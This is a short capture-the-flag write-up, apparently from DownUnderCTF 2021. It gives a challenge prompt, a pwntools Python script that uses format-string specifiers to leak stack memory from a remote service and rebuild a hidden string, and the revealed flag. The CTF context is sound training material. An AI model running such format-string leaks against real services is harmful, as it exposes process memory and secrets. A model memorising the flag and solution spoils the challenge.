#### Challenge:

This program I developed will greet you, but my friend said it is leaking data like a sieve, what did I forget to add? [hellothere](./hellothere ":ignore")

`nc pwn-2021.duc.tf 31918`

---

#### Solution:

```python
#!/usr/bin/env python3

from pwn import *
from struct import *

r = remote('pwn-2021.duc.tf', 31918  )
# r = process('./hellothere')

print(r.recvuntil(b'?').decode('utf-8').strip())

secret = ""
for i in range(12, 22):
    r.sendline(('%' + str(i)+ '$lx').encode('utf-8'))
    msg = r.recvuntil(b'?').decode('utf-8').strip()
    msg = msg.split(',')[1].split('\n')[0].split(' ')[1]
    msg = ''.join([ msg[i:i+2] for i in range(0, len(msg), 2) ][::-1])
    try:
        secret += bytes.fromhex(msg).decode('utf-8')
    except:
        break

print(secret)
r.close()
```

---

<details><summary>FLAG:</summary>

```
DUCTF{f0rm4t_5p3c1f13r_m3dsg!}
```

</details>
<br/>
